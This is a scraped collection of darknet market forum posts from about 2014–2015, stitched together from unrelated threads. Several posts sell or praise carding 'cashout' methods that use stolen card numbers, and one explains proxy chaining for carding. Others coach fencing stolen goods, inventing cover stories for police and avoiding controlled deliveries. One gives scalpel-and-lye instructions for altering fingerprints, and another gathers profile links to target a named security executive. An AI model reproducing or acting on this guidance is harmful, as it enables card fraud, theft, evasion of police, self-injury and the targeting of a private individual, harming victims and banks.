"Evolution Forums","wefinance","8072","2014-04-24T23:40:57","Re: CC Cashout Method up to 1k daily","Guides Vendors","Basically this method works like paypal. You card a certain website with no security. They will withdraw your funds to ""paypal"" and after that, ""paypal"" will send it to your bank. You do not control the time of the day you want to withdraw it but it does it automatically every day.  First two charges went through with no problem totaling 85 bucks. Lately every time I charge a credit card and it approves it there, but after ""paypal"" reviews it, they cancel it... As with the real paypal you have to verify your bank. So after verifying my bank with this ""paypal"" my balance in my ""paypal"" account shortly went to 0.00. All of the charges made earlier were refunded to the original owners out of no where ... Debit cards are the only ones that went through  just saying..

Site to card was new to me, but the concept and the processor I have seen before. After a few pointers regarding the content, OP improved the guide, how it was structured and has provided some ""tips"" at the end of the guide. More pointers given regarding BINs inclusion, up to OP whether he wants to include BINs or sell them separately.  So, the guide is good, the theory is good and it's originality is good. Content is structured well and it's easy to comprehend. I do agree with mrwaterhands on what he has said ""It's all about BINs"". As with carding in general, there are ways to improve success by using specific BINs for specific tasks.  I will be testing this method so I will report back on that. For now my thoughts should be taken as is and I do not suggest the method is a working method.",""

As of August 21st the payout is .0002 per 5 minutes, 15 days ago it was .004 BTC per 5 minutes, the value is constantly changing. The guide was typed up by myself and is neatly organized/formatted and goes into great step-by-step detail. The guide is highly reuseable and can be done over and over. It does not require any investment or any skills, just the ability to read 3rd-grade level English and following instructions. This guide pays for itself. Regards!

It was deleted because what I was advertising was based upon what the payout was a month ago. The payout of the method has changed since last month and thus, it brought negative attention selling at the price I was, claiming the payout was higher - I'm not here trying to false advertise or lie to anybody so I deleted the thread. Everybody who purchsaed at the old price was messaged and refunded. This version is updated and goes into more depth, and I am charging not even a penny for it. There's plenty of guides that are based upon free information, but I believe for a penny it's worth an in-depth, step by step guide with extra information and tips included. Not to mention, the payout from this covers the price of the guide. You're most definitely entitled to your opinion though!

An amount that small is hardly going to be noticed and/or cared about. They're going after vendors and they're going after big customers. An amount that small is either bound for the garbage, some postal employee's pocket, or to it's proper destination. Eights of weed are on nobody's priority list. I also don't see that receiving weed in the mail and keeping it as more of a crime. Sending it through the mail certainly is.

Perhaps somebody knows that you purchase drugs online and receive them under that name and they were trying to spook you. I think this is infinitely more likely than the pigs, but really the most likely story is that he was looking for a dude named James and James doesn't live there anymore or lives nearby or whatever. It is a pretty common name. Still, you should get a new drop and a new alias, just to be on the safe side. If people do know what you do, try to convince them you have stopped.

Of course....CANCELLED!! Fucking NSA. I was going to attend this too. But they didn't want to tip us off right before they were about to take down Silk Road 2 now did they?  This is the tor blog itself talking about it https://blog.torproject.org/blog/recent-black-hat-2014-talk-cancellation The comments have some good info about this as well. I don't trust TOR, it's like in the past when many ""carders"" used a VPN service that turned out to be run by the secret service....which of course got most of them busted for trusting their life with a single service. Back then, a VPN was seen as equal to TOR to many people. Lots would even connect to the VPN from their home internet connections...which is a lot like how people of today seem to trust TOR... I'm not saying TOR is in bed with the NSA, but it honestly wouldn't suprise me one bit if the US government offered them a TON of money to help them catch certain activity. The best way to ensure security, is at a basic level (Don't do illegal things from HOME)! There are some better articles about this, but I can't seem to find them now...it was a big deal right before it got pulled. Literally everyone was waiting to see the ""briefing"" as they call it. Then mysteriously pulled last minute...they cited ""legal issues"" as the reason...lol...yeah right...","HenryHill1 wrote:dopeman419 wrote:If doing something that could get you thrown in jail, you should assume tor is compromised.

"Evolution Forums","quietForest","35758","2014-12-06T09:45:55","Re: Tor trojan detected","Security & Anonymity","I would suggest the opposite. Definitely download thru Tor, just make sure to verify it once downloaded (see instructions on download page). Verifying it will solve any potential problem caused by downloading thru Tor (malicious exit node adding malicious code) and it will confirm whats already more than likely the case here, which is that AVG/Windows Defender/Others are intentionally flagging it because they want to scare you into not having it/using it. This is a common practice with lots of different programs, and is even documented on the clearweb. Don't be fooled by propaganda, verify for yourself that what you downloaded is what the Tor maintainers intended for you to get.","dumpthedump wrote:Did you use tor to download it?

"Evolution Forums","popadoppalus","35758","2014-12-14T19:52:38","Re: Tor trojan detected","Security & Anonymity","@spyker and others. of course you can use TOR on Windows. the whole AV software has become a joke, because the exploits are using zero day exploits and there are no virus defs that are included in the updates. i actually run boxes with no AV software at all, but i take other precautions. we are in the process of patenting a hardware device that will make AV software obsolete. it is based on the simple premise that in order for malware to do anything mal it has to talk to somebody somewhere and it is possible to detect, identify and defeat such transmissions. i always get curious when MBAM or whatever is the acronym pops up a message saying that it blocked access to a potentially malicious site. i know some of those guys over there and have worked with them since the DOS days. i don' know how they determine a 'potentially malicious' site it is a trade secret. they give the IP and have checked some of them out. Sometimes they are TOR nodes. i read an article talking about how one of their routines was vulnerable to a MITM attack. seems to me there whole op model is a MITM attack as the are looking ahead at content before it loads in the browser. they just do the first half. false positives - well don't get too complacent. there are bad versions of TOR out there and they can be malicious. i have win 7 box that would run TOR fine and then start reporting trojans after a few uses. i could reinstall it from the same download and it would be fine for a few sessions then report a trojan again. if i rebooted it didn't happen, so i figured there was something resident in memory (could even have come from yahoo.com on clearweb or my wife on Facebook). you live distros including TAILs are usually read only (or non persistent in TAILS case, as it uses a RAM drive) so any malware has to stay resident in RAM to be effective. i used to leave my computers on all the time  - no more - servers yes - worstations no. shut them down when not in use it preserves your encryption (mostly). but that's a whole other discussion, and we have machinists working on that as well.

It can definitely be a little sketchy, but as long as you go with the right vendor, you should be fine. You just have to tumble your bitcoin into an anonymous wallet after you purchase it to cut all ties to it, and then send it to the vendor after they provide you the address. Communication is usually through email, and sometimes, vendors will offer proof pictures/videos of your actual ID with the information you wanted on it, and then you pay and have it sent to you. I can vouch 100% that buying a fake id is more for the clearnet than the darknet.","zizzy wrote:BlueHighSky wrote:I suggest buying on Evo. Buying through clearnet is just plain retarded.

This time it is an Easy method to get semi-clean funds into your paypal account with random credit cards, and at best they can even be registred to paypal so you can use any cc you want to pay. Payout to you account is once a week, so the total process won't take longer then 6 Days. What you need:-verified pp account-random cc's How long does it take:-Preparation about 20-30minutes, check around 10-15minutes every day until cashout so around 1-2h of total work  How much can i make:-there is no real maximum, but whatever if your account doesnt have good history it aint worth to tr big amounts of more then 3000$ usd. I suggest 1000-1500$. How fast will it get saturated:-it is pretty unkown by cardes and frdsters so i guess it will run quite long Why i sell this:-no luck with paypal at all Price:will be sold at 0.25 BTC link to shop:http://k5zq47j6wd3wdvjq.onion/listing/46575

I know that you can simply use a bug detector to detect the camera. But if a fiberoptic camera's cord is 10 feet long, allowing the camera to be buried deep inside a wall, and the lens is sticking out of a small hole in the wall, how do you detect the lens and cord? A bug detector would not be able to detect a fiberoptic camera buried 10 feet into a wall or ceiling or floor. Even turning up the sensitivity on the bug detector would cause too many false alarms.",""

One w/ Bins I'm using on it. - 100$And one w/o the Bins I'm using. - 135$  Listing: http://k5zq47j6wd3wdvjq.onion/listing/8126  You can select your version in shipping options.    A little notes: If you're trying to transfer very high amounts of around 600+ dollars, there's a chance you'll trigger a ID verification system. Or a VBV or MCS code, however the bins I provide are non-vbv and MCS.

Ideally, it's priced pretty cheap as-is.. It will rise in the future when the first few vouches come on in.  30$ vouch copy to the first customer, ROI is less then 30 minutes at this price.

The users of the card are affected in a negative way as well as the issuing banks.You're stealing peoples' information and using it for your own personal gain. It doesn't make you any better.

As the OP says, this guide is meant to be for newbies, so, the reader, i.e. the newb who will read it, will find it pretty easy to understand. No heavy words, written in spoken English. 2) Method: This method might be well known to someone who is already initiated in carding, but, since it is written for newbies, this guide has everything you will ever want to know about chaining VIP72 Socks with Tor. This guide was written somewhere else, the OP has provided credits to him, in this guide. I must say, the original author might have made a few mistakes while writing the original one, but, the OP has corrected those errors. The guide also provides links to the tools you will be needing beforehand, and, the OP has provided a guide that is free of errors, works, and also, I, myself have tested it. Also, I found some negative points too. For this small a guide, I would prefer buying this guide if it were for $10 or so. But, this is OP's choice to set the price to whatever he wants. Final Verdict : For newbs : 5/5. A must buy if you have just initiated. This will be the only guide you'll ever need (in terms of a tut. to chain VIP72 and Tor). For advanced users : You know this method, do not buy it.  -----------------------------------------------------------arcana.",""

Maybe your chain is in the wrong order. Maybe you are using some weird ports or something when you were originally trying to get it to work. This one dude couldn't get it to work forever cause he was putting in values he found somewhere instead of 9151, no idea why. Once he did it worked. Maybe uninstall and start over, cause I dunno whats been changed. With a fresh install it should be pretty easy. Download the bundle, install it. Then all you need to do is add the chain rule in proxiefer. ----Profile --> Proxy Servers -->Then add tor, 127.0.0.1 port 9951.vip72 should already be here as 127.0.0.1 port 9151.(if you downloaded the prefigured version of proxifier from vip72). Then click and drag to the box below with tor being first and vip being second (exit node).--- It might be your default port for Tor is not 9151, maybe 9050. but you can just check in the client. --- You dont need to do anything else it will automatically work in firefox and other programs as the rules are global, when the proxifier is running and the vip72 client.

Do you mean the parcel you were supposed to receive was empty or customs sent you an envelope and it was empty? In both scenarios two things might have happened --1 - Your package was intercepted but customs and it's being held there. I don't know where you live but ordering international is very risky because there's always that small chance that there's a drug dog or someone's package is randomly selected for a search. If a package is selected then they'll cut it open carefully and check the contents then if it's nothing they'll tape it back together. 2 - Your package was intercepted and it's being held there. You will be asked to pick it up but you're quite stupid if you actually go and pick up your package that contains illegal contents. I suggest clearing your home completely of anything incriminating because it's high possible you'll have a controlled delivery. A controlled delivery is when LE will go to your door disguised as a mailman/fed ex and try to get you to sign the package. You could always say that you were never expecting a package and it should be sent back. I received a CD once and I clearly saw DTs sitting outside my home.

From doing the same postal round day in and day out, I knew the names of the people who lived in each house. I was not a moral person back then, and more than once I opened interesting-looking packages which were addressed to names I knew didn't live in the house.

Change suburb location so there's no pattern to your listings. Use disposable details, i don't even include a mobile number as it's one less link and it's easy enough to communicate through email and coordinate exchange. Don't develop a pattern and list too many similar items too regularly or list 3-4 of the same item at once. When completing the sale don't have all your shit with you, only carry what you're in the process of selling and don't keep all your loot and the packaging it came in at your house,spread it around. If you're coming back from your drop and it's garbage day drop it in a randoms bin or go to a local shopping village\center and get rid of it in one of the bins out back as they're generally not locked during the day.  Have a story that covers your ass if you get caught out, why you might not have proof of purchase/ how you came into possession. Something like i was in Coles/Bunnings/whatever car-park and some random was selling them cheap and said they were legit, Being naive isn't a crime. Use your imagination.  Be forgettable during the exchange, don't rock up pimped out like some dipshit in a tupac shirt, be a normal guy who looks like they'd genuinely have a Dyson or whatever to sell. Don't give them a reason to think anything about you is suspicious. Watch the info you're giving away during these exchanges; fake name, fake job, fake fake fake. Try to set it up like you have in a central,convenient location and change it up. Avoid places that have security cameras. It looks like you've come to the same conclusion as me in regards to moving items that require online registration, things like iwhatevers and kindles i generally stay away from.  Don't get greedy, slow and steady stays under the radar.  If it's any consolation drops are a giant pain in the ass for me as well. I'm considering investing in Ucards method but I'm not 100% certain it will work for our country.",""

In fact to boot to anything other than WIN8 you have to go into the BIOS setup and disable fast boot and change a couple other parameters in order to boot to Linux or some other version of Win. I still use WIN PE all the time because you can control everything it does. you can tell the extent to which your system may be compromised by monitoring all the data going out of your IP address with a sniffer. that will give you a picture of your total LAN. if you wish you could do the same on any individual box. we are currently designing and building small hardware sniffers for just this purpose. in the meantime there are software solutions that let you monitor traffic.",""

I Think we should make a thread of these places. I have a few more known entities that are lurking lets watch them as they watch us. Post what you know. This is nothing new, so don't get all panicky and stop sharing. It takes them a long time to close methods and even saturated methods go on a long time before they are closed. Its so expensive to adopt new security methods and a hassle that they stay open. Hiring these guys and they're software is expensive. Often they will go unclosed. Anyway we should be aware of what they are up to. This was written a while ago and I thought of making a new dude to not draw attention to myself, so it might sound weird, as it was meant to be kind of generic. I also didn't wanna piss off any mods or anything but I feel we have a right to watch them as they us. ---Erasing Posts before that big conference?--- I can think of one good reason to leave a Government Position, your no longer bound to uphold the laws that protect us. Your also not bound to just the country you reside in. Then the other is the huge amount of money that can come with development of these fraud protection packages sold to retailers and other companies. There are lots of penetration testers that don't make all that much though. They hide amongst us in plain sight. Making transactions and sometimes dishing out tips to build reputation. Which come up missing later (God forbid the news or other legitimate entities find you aiding in theft or fueling the need for your services as fraud prevention).  I really dont think you should be able to delete or edit posts more than a certain age without admin approval. Plus its just super irritating when your searching deep for answers to find a bunch of holes in a thread. Leaving stuff up will more than likely only help the defendants as the prosecution more than likely images sites they monitor daily. At least the defendant can show the hole story and possibly build a entrapment case or other defense. Don't let greed get the best of you. Make security your priority and protect your anonymity. This guys seems to be here just to burn methods and profit off it more than anything, but he has friends with other agendas. ---- Ok so who is this guy? ----Tom Pageler Chief Information Security Officer Tom joined DocuSign as the Chief Information Security Officer (CISO) in June 2013. Tom brings more than 15 years of experience in information and physical security. Most recently, Tom served as the Deputy CISO for JPMorgan Chase where he led cyber-security, fraud prevention and protective intelligence for the firm. Prior to his role at JPMorgan Chase, Tom was the Head of Risk Assessments and Director of Fraud Control for Visa. During Tomâs time at Visa he helped to launch the Payment Card Industry Security Standards Council (PCI SSC) and remained on The PCI SSC board of advisors during his time at JPMorgan Chase. Tom also was a Special Agent with the United States Secret Service, where he established the San Francisco Electronic Crimes Task Force and was responsible for identifying, apprehending and successfully extraditing leaders of a large Eastern Bloc organized crime ring. Additionally, he provided physical security for the President of the United States, the Vice President, their families, and foreign heads of state. Tom holds a Bachelorâs Degree in Public Administration from the University Of Arizona Eller School Of Business, a Masters of Business Administration (MBA) from Thunderbird School of Global Management, a Masters in Public Administration (MPA) from Harvard University Kennedy School of Government, a CISO Certification from Carnegie Mellon University Heinz College, and an Advanced Computer Security Certification from Stanford University.--Source:http://www.docusign.com/company/leadership(You can find his friends here too)  LinkedInhttp://www.linkedin.com/pub/tom-pageler/1/325/5ab Facebookhttps://www.facebook.com/people/_/1504285638 Piplhttps://pipl.com/search/?q=Tom+Pageler&l=San+Francisco%2C+CA%2C+US&sloc=&in=6 Who He's working for/with DocuSign:https://en.wikipedia.org/wiki/DocuSign#cite_note-1http://www.docusign.com ------Ok so what? (The secret service and other LE isn't anything new)-- Well its what Pageler said in a recent NPR interview that makes me believe he's here.(I dont know of many reputable forums as great and in English) -----------The article:---- Risk Is Low And Business Is Booming In The Malware Market by Aarti ShahaniFebruary 21, 2014 3:33 AM --Listen:--http://pd.npr.org/anon.npr-mp3/npr/me/2014/02/20140221_me_risk_is_low_and_business_is_booming_in_the_malware_market.mp3?orgId=1&topicId=1049&ft=3&f=280439157 (I dunno how safe it is to listen to this, depends on your setup. So clearnet warning, at the very least copy this link so as not to leave a refer)--Or Read Below:--Malware is malicious, bad software. It's the code that cybercriminals use to steal credit card numbers and bank accounts. And the big showed how good these criminals are getting: They've built a thriving underground where credit cards go on sale before anyone even knows that a massive breach has happened. On a recent day at a crowded Starbucks in downtown San Francisco, Tom Pageler powers up his laptop and takes me online shopping â with a twist. Pageler is not one of the cybercriminals. He's a former Secret Service agent who studied them and is now in the private sector, with a Bay Area company called DocuSign. He takes me to the anonymous Tor network, to a website that requires a login. He doesn't want to reveal the name of the site because he doesn't want to tip off anyone. Being a trusted user on a criminal website takes work. It's a lot like eBay; you have to visit, buy and sell regularly, and get rated and reviewed by your peers. ""When they transact with you, no one's getting arrested, no one's getting burned,"" Pageler says. ""So every time you make a transaction on the underground, you're just building your street cred."" Today, credit cards are on supersale. Pageler says that means a big breach just happened. Strangely, platinum credit cards on the site are selling for less money than gold cards. Apparently people in the underground don't just look at credit limits; they do analytics to see, according to the data, what banks have the weakest security. ""For them, they'll know based on a bank ID number which bank it is, and where they're getting the best return on fraud,"" he says.Related NPR StoriesSen. Patrick Leahy chats with Sen. Mazie Hirono before hearing from retail company executives on Tuesday.The security breaches at Target and Neiman Marcus have raised questions over how quickly companies are required to disclose that customer information was hacked.A cryptographic chip embedded in a British debit card. America is nearly alone in still relying on magnetic stripes to authenticate purchases. Pageler is showing me how a low-level operator would work this site. Say I wanted to launch an attack. Without any specialized coding skills, I could buy the package of services I need: A list of 10,000 emails, customized by age, gender, region, goes for just $79. To make sure the emails work, there's a ""cleaning price"" of $48, Pageler says. For another $50, I get malware called a key logger, which will latch into a victim's operating system and follow every keystroke in search of strings that look like bank logins and account numbers. Payment is made with an account that's like Paypal, except it is Internet cash that's hard to trace, and the servers are overseas, so American police can't really subpoena records. I need one more thing, called a botnet â a vast network of computers under the control of a single bot master. For this, Pageler hands me off to his colleague, botnet specialist Tom Brandl, who shows me options as cheap as $16. He makes a simple analogy to the drug trade: ""These would actually be the guys on the street corners, collecting money and distributing the drugs."" The bots send out emails, and between 5 percent and 10 percent of recipients open the attachment, which lets the crooks in. The bots crawl around waiting for bank passwords. Then they can drain the money to the overseas account. Millions upon millions of unsuspecting computers â maybe even yours and mine â are part of botnets, making it nearly impossible to find the real criminal. ""If I'm the bank, I go back and say, 'Hey, I saw this login from this address.' I go to check that address, and it belongs to a grandmother in Sioux Falls. Basically the trail is dead at that point,"" Brandl says. Giovanni Vigna, a professor at the University of California, Santa Barbara, who studies cybercrime, says it's basically a crime without risk. ""If you look at the size of what gets stolen, there are wildly varying estimates â we talk about billions, and you think about how many actual convictions there have been. It's amazingly low,"" Vigna says. The incentives to join the underground are amazingly high. With just a couple hundred bucks, I could drain enough accounts to make $500,000 and grab data to resell on the hidden websites.

Type - anonymouse vpn - you'll find loads of links, look for one that compares many (nb/ any site will have a prefference for certain vpns to other) - look for the ones that only accept virtual currencies, and if you can find the few that are onion sites, then you're in luck.  Nb/ not all vpns are legit (when you go to their sites, always scroll to the bottom and look at the copyright crap - you'll see where the father company is based - example is a sweedish vpn service saing it's anynous - but it's company is based in the UK - always fishy). If they don't log, that's cool as far as logging when you accessed the service, and if they have it, who you are. The problem isn't logs, it's the pressure a global adversary/LE may put on a VPN.   Look at it this way, if some guy came into your shop and wanted to buy something, you'd be kind and try to help him spend more.  If he hides behind a stack of something, n the police burst in, are you going to hide the guy or turn him over? At the end of the day, there is one VPN that only does 2 things, one it gives you an onion link, when you get there then you have your annymous account.  then you pay the btc (they only accept virtuals) - then you're done. you just need to save the link, and you can create a new one at the end of each session. this is anonymity.   Can't say who they are, but after about 20-30 mins you'll find it.

Bitcoin users in need of serious transaction privacy should avoid popular services like Blockchainâs SharedCoin and other CoinJoin implementations, according to a well-known security expert. Consultant Kristov Atlas, author of the book Anonymous Bitcoin, published a security advisory today saying weaknesses in SharedCoin offered privacy only from âunskilled examiners of the bitcoin blockchainâ â and even then, only until more sophisticated analysis tools were made user-friendly enough for the average user to deploy. Blockchain CEO Nicolas Cary said he was satisfied with the research and the way it was handled:     âWeâve been in close communications with Kristov and appreciate his diligence. He takes privacy seriously and so do we.â CoinJoin Sudoku Using a software tool he created himself called âCoinJoin Sudokuâ, Atlas analyzed thousands of transactions identified as using SharedCoin and determined he could identify relationships between specific payments and payees. Coinjoin Sudoku works by searching for common ownership of the multiple transaction inputs and outputs that SharedCoin uses to obscure identity, grouping them where ingoing and outgoing amounts match. Blockchain has responded to the warning with a blog post reminding customers that SharedCoin and CoinJoin offer protection only against âcasual observersâ.     âThey do not prevent a determined investigator from correlating transactions or an adversary with information about specific addresses from correlating them to specific payments and payees.â How SharedCoin works Blockchain.infoâs SharedCoin service is an open-source implementation of the CoinJoin privacy protocol, and is often referred to as a âmixerâ. While transactions on the bitcoin blockchain are open for all to see (at least at the public address level), SharedCoin will collect a group of users wishing to increase privacy and join their transactions into one âmaster transactionâ before broadcasting it to the network. The transaction that then appears on the blockchain would have multiple outputs and inputs, supposedly making it worthless for analysis. Customers may select the number of times to repeat the SharedCoin process, between two and ten. While offering enhanced privacy to users, SharedCoin and mixing services hope to better protect all users by making the bitcoin blockchain overall a less dependable tool for connecting bitcoin addresses to individuals.Need for privacy Blockchain officially began offering SharedCoin as a free service to its users last November, around the time Matt Mellonâs âCoinValidationâ and other services appeared, which promised to track specific bitcoins and addresses connected to suspicious or other investigation-worthy activity. It did not claim, however, to provide 100% protection from such services. Older style mixing tools (also known as âtumblersâ) would forward a payment around several different addresses to make the originator hard to find, usually on a private server, or âoff-chainâ. Such systems, however, required trust from users that anonymous operators would not simply confiscate or steal the bitcoins before they emerged from the mixer. SharedCoin, and the CoinJoin protocol itself, provided a system that required less trust in the operator, by taking advantage of a bitcoin transactionâs ability to have multiple inputs and outputs.Crunching through transactions Atlas analyzed 20,000 transactions across 45 blocks on the bitcoin block chain and found around 2.6% fit the profile of a SharedCoin transaction. CoinJoin Sudoku identified groups within a transaction with equal amounts (marked red and blue in the diagram below) then examined inputs and outputs one digit at a time to identify possible relationships.   http://www.coindesk.com/blockchains-sharedcoin-users-can-identified-says-security-expert/",""

MITM attacks and http access (ie not https) are a risk to privacy whatever you use on the internet and TOR is no exception, and it says so on their site and TAILS site as well. however the recent pulled defcon talk on de-cloaking TOR users was worrying and there may be problems with it, but i think we have to focus on the tech here rather than what i see as irrelevant side issues.you can be anonymous on the internet, but you really have to know what you are doing. its quite hard. a second hand laptop (gotta check your firmware isnt compromised! http://www.wired.co.uk/news/archive/2014-01/20/open-source-laptop) running a decent distro of linux bought with cash and no cameras about, only connecting via public or open wifis (with no cameras about again) via say a service like TORâing into eg vultr VPN then through TOR again, would be very difficult to trace and even if your threat did trace the IP back to the open wifi network, they would have nothing on you because you leave and then connect with another one. i would also recommend a plastic nose and glasses if you are going this route."

It may, or may not, have vulnerabilities or traffic analysis that can sometimes be used. From what I've seen, LE is using obvious tactics to catch the newbies. Presently they are surveilling and collecting evidence. Then they'll do their next round up. They were quoted as saying they'd include buyers this time, and they might - as a scare tactic. Set an example out of a few poor people, ruin some lives.  We all switch to I2P, it happens again. Why? Because people are dumb. Even smart people. In fact, smart people make the world criminals.

It also can restrict use of PnP device forwarding, etc. It doesn't use, however, the standard MSRDP port. It does however offer different types of remote access such as file manager as opposed to only remote control. It even has encryption.  Just a suggestion is all...it was actually a plugin for Carberp, when it had still been active as a botnet....but has a standalone version. You can use a stub too, rather than connect to only already-existing RDP servers. There's a panel though it's broken. It also uses indirect routing to improve stability, using its ""worldwide routers."" It allows proxies like tor, even. Also RDP is generally useless as far as security goes, as is VNC, because it's primitive and easily hijacked. Try to use a Debian server instead of a Windows one, and setup an SSH server, since it's much more secure, and you only would need bash to do what needs to be done in most things. Try to use a 4096-bit DSA key. Use a password with spaces so it can't be brute forced. Run it on the backend AND the frontend, server vs client, both through tor. Use a virtual home path and require private key authentication. Oh and Restrict IP address to only Tor ranges, which can be found here: [CLEARNET WARNING] https://check.torproject.org/cgi-bin/TorBulkExitList.py?ip=127.0.0.1&port=0 , assuming you plan to ONLY access the RDP through tor.

Are those who don't tumble BTC at risk? I wouldn't think so. LE would have to know about a BTC purchase and consider it a BTC purchase with intent to buy something illegal, they would then contact the BTC exchange and ask for the wallet address, they would then run a simple search on the wallet address and find the transactions there. It would take LE to already know about existing BTC wallet addresses attached to DNM's to know that something illicit has been bought. But then again, unless they can attach this BTC to a name and an address, all they have is a BTC transaction and no name and address which is where the falling argument stands still.

BTC exchanges send hundreds of BTC some exchanges send that daily, if not in less time than that and you just think about the ratio of illicit intended sales with those BTC and genuine.

The recommended stamp for small orders is the large 1st class stamp Currently the maximum dimensions for 1st class large letters are: This should be more than adequate for most orders, obviously vendors are going to hit the limits with larger orders. Some more tips: - Large letter 1st class stamps are currently Â£0.93, you can look up the specifications for stamps on the RM website. Large 1st class letters can be posted in any normal postbox.- Stuffing a DVD case into a padded envelope will likely you take you over 100g - this weight limit is not strictly enforced but you should weigh your parcels if in doubt and never intentionally send a letter overweight.- The thickness limit of 25mm is very strictly enforced, by an automated tumbling machine with slots. The letter must freely fall through the slots otherwise it is diverted to manual sorting, the recipient will incur the charge.

We need to advertise tor on youtube,twitter,facebook. Myself i have been using tor for 3 years now. I have translated in my own language many tips and tutorials about tor and general opsec tips. And again the more people will use deepweb the better, because it be much more noise in the network. The more attention the tor has the better. Just be smart when you will be advertising tor for other people. Not everyone want to buy drugs here, say them about freedom of speech and other things  Here you can see how many users connect straight to tor from your home country https://metrics.torproject.org/userstats-relay-country.htmlIf you can make it grow we all benefit   Don't have time ? If you have money you can pay people to write,translate,make video about tor. I have ordered few gigs on fiverr, so they make some videos about tor and so on.Also you can run exitnodes, it helps tor network and its fun to see what people browse when they exit tor  Crazy things you can see You can also pay to https://www.torservers.net/ and they run exitnodes.

Now it could be since it was a carrier unfamiliar with the route that they put into the wrong box since its a communal type. My question is what type of plausible deniability could i use if LE were involved and tomorrow all hell breaks loose? my first thought was to say that i have been collecting mail for a transient dude that a i frequently run into and give him a few bucks here and there and that he told me he didnt have id and was unable to receive mail anywhere and that i obliged him and frequently will get his mail and leave on the enclosed porch and he comes and gets it at his leisure. some more background is one of these packages comes quite frequently and im sure my usual postman knows that. Can anyone give me a good story i could use that could get me out of hot water. I dont think there is anything else tying me to the shipment. any advice or ideas would be greatly appreciated. feel free to reply here or pm me. It would be a huge help and help with this crazy anxiety im having now. also the pack is not in my name, it always has a business name on it and its not a dark web pack, but with same type of items.",""

With this specific method you had several options to purchase how much BTC you wanted as low as .1 to as high as 1. I learned there was no specific BIN that works 100% of that, so that was really nice because if you find the cheapest vendor with at least some fresh ccv's you would be good to go. I kid you not I invested 1.25BTC into Altair's method and less than .5 BTC into ccv's and receive back 4.2BTC in less than a day. LESS THAN A DAY. Probably spent 2-3 hours just entering in ccvs and seeing if they go through or not, oh man was it worth but then again a stupid mistake of mine because I entered someones actual email they said they did not make this charge but I still received the BTC but a day later they implemented new security. But no problems at all because there is another way around it but you'll have to spend a little bit more for the dump. All in all....11/10. If you ever get a chance at again at a ccv->btc guide and it's from an actual experienced member with credible reviews, don't hesitate. Props to you Altair."

I am concerned that people are writing about their location and other identifying information too much. I think this community is great and it's awesome how we share all kinds of helpful info. I am just becoming concerned of how vendors talk about sensitive information unencrypted and on the other side of the coin buyers who send address information in clear text. We are already taking a big enough risk with trusting a faceless entity with our information and receiving our products without communicating PI in clear text. I think most people here aren't knowledgeable enough or on secure enough set ups to be doing this. If evo was to be hacked or an informant wormed their way in you are increasing your chance of being caught. Let's not forget how many times LE has infiltrated dark markets way before tor was popular. Shadow crew probably being one of the best examples. This kind of attitude could lead to the downfall of individuals and ultimately the site if we become too relaxed. As others have mentioned before this site has the second largest traffic of dwms. This place has a lot of heat for sure and we have to work together to weed out the rats not make their jobs easier for them. I don't have the link to hand but some people were requesting a mobile version of evo. Seriously guys? This isn't ebay or amazon.

"Evolution Forums","studiouspanda","43035","2015-01-17T03:25:05","Re: anyone know how to change your fingerprints permanently?","Security & Anonymity","Yes, you can do it. I had a much longer explanation somewhere, but i'll do my best to recount the important parts. So, no matter what, it seems theres no way to do it permanently without a hell of a lot of pain, however you can avoid scarring that makes it appear obviously that your fingerprints are altered. So, the epidermis is the outermost layer of skin. Fingerprints form because of stuff under the epidermis, so this means you could totally remove the epidermis, and your fingerprints would grow back just the same. This means trying to burn/sand/etc your fingers is definitely the worst, and most painful method to attempt to change your fingerprints, and it's almost guaranteed to fail. So the important layer is the dermis, underneath the epidermis. What forms your fingerprints is bumps in this layer that protrude into the epidermis. So what you need to do, is use a scalpel or very thin blade, to cut entirely through the epidermis (epidermis thickness varies from person to person, and by finger, with the thumb being the thickest and pinkie being the thinnest), and damage/alter the dermis. The recommended way to do this is to put a very small pellet of lye into the cut. No matter what you do, this is going to burn like absolute hell, not a whole lot you can do about it, but being precise, and using a small amount of lye, will limit this. Picking where you do this is also important. If you just pick a few random places, the cuts and burns might have no effect on your fingerprints. You need to target minutiae specifically. you can google them for images, but you mostly want to focus on dots, ridge endings, and bifurcations. One pellet of lye would certainly be enough to potentially remove a dot completely, change ridge ending, and move bifurcations. Particularly dots. If you want a temporary way to obscure your prints, or prevent yourself from placing them without wearing gloves (suspicious), you can use some kinds of glue to make a thin seal on your finger. you wont place fingerprints this way. Theoretically, if you were about to be fingerprinted by being arrested and whatnot, and wanted to avoid being identified, if you had the glue with you, you could use small dots of glue to obscure major minutiae, such as dots. Too much and your prints would make that obvious, but the right amount and it would prevent a match. However, if you want to get released, you'll sit in jail as a John Doe unless you have a clean SSN/identity (no criminal record) to add the record to. Of course this wouldn't work if you had your real ID with you. You could also theoretically put this glue on your finger always just as a precaution, though you'd have to reapply it often. Finally, its important to note that no matter what you do, your fingers could eventually heal. The brother of some bioengineer was playing with his remote control helicopter, and it chopped off the tip of his finger. The bioengineer was researching extracellular matrix, and sent this to his brother to apply to his wounds to see if he could regenerate his fingers. He sprinkled the extracellular matrix on his finger, and his fingers completely regenerated, with no scarring, and he even had identical fingerprints. So even though he went from having no dermis to a new dermis, the one that grew in was the same as the old one. Permanent scarring to the dermis, and not regenerating your dermis is the only way to ensure they stay changed.",""

If you acquired your current VPN over the clearnet or paid for it with a debit / credit card in your RL name, then your only option is to connect to the VPN over the clearnet and then to the Tor Network from the VPN.   If you're using Tails, why not use a Tor Bridge to connect to the Tor Network. The Tails devs don't recommend using a VPN with Tails and you can read more about why here -   https://tails.boum.org/support/faq/index.en.html#index17h2  If you want to use a VPN, you should consider using Whonix on a host PC running a Linux OS (not Windows). The host PC can then connect to a VPN and from there you can run Whonix. It at least provides the user with virtual isolation of Tor from your applications (something Tails doesn't do).","bouncy12 wrote:OK so i have a vpndo i connect to it over clearnet? or does that defeat the purpose?also i have a burner laptop that i use tails with. but im not sure how to get my vpn to work on here.so i was going to use my personal pc with this vpn what u guys this?nothing too illegal. greyhat cpa stuff"

They all keep logs and even the ones claiming that they don't, I believe it's best to assume they do anyway, just in case.  As I said previously, some people believe it's best to log into your VPN first and then run Tor from there where as others believe that it's best to connect to the Tor network first and then log into your VPN. Do your own research first before deciding what to do as it's an important step.

